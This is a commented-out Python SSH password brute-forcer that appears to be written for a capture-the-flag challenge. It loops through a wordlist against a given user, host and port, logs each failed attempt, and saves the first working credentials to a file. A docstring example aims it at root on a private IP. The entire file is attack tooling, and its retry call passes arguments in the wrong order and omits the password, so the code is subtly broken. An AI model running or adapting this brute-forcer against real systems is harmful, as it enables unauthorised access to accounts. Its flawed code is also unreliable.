# import os.path
# import socket
# import time
#
#
# class SSHBruteforcer:
#     def __init__(self):
#         pass
#
#     def run(self, username, hostname, port, passlist) -> None:
#         """SSHBruteforcer().run(user="root",host="10.138.2.17",port=2222, passlist="hex_upper__4_4.txt")"""
#         print(f"{colors['FG_INFO']}[*] Attempting login at: {username}@{hostname}:{port}{colors['RESET']}")
#         passlist = open(os.path.join(paths["OUT_DIR"], passlist)).read().splitlines()
#         for password in passlist:
#             if self.is_ssh_open(username, hostname, port, password):
#                 open(os.path.join(paths["OUT_DIR"], "credentials.txt"), "w").write(f"{username}@{hostname}:{password}")
#                 break
#
#     @staticmethod
#     def is_ssh_open(username, hostname, port, password) -> bool | None:
#         client = paramiko.SSHClient()
#         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#         try:
#             client.connect(hostname=hostname, username=username, password=password, port=port, timeout=3)
#         except socket.timeout:
#             print(f"{colors['FG_WARNING']}[!] Host: {hostname} is unreachable, timed out.{colors['RESET']}")
#             return False
#         except paramiko.AuthenticationException:
#             print(f"{colors['FG_ERROR']}[!] Invalid credentials for user=\"{username}\" password=\"{password}\"{colors['RESET']}")
#             return False
#         except paramiko.SSHException:
#             print(f"{colors['FG_INFO']}[*] Quota exceeded, retrying with delay...{colors['RESET']}")
#             time.sleep(60)
#             return SSHBruteforcer.is_ssh_open(hostname, username, port, password)
#         else:
#             print(
#                 f"{colors['FG_SUCCESS']}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{colors['RESET']}"
#             )
#             return True
#
#
# if __name__ == "__main__":
#     SSHBruteforcer().run(username="app-script-ch1", hostname="challenge02.root-me.org", port=2222, passlist="wl_common__4_4.txt")
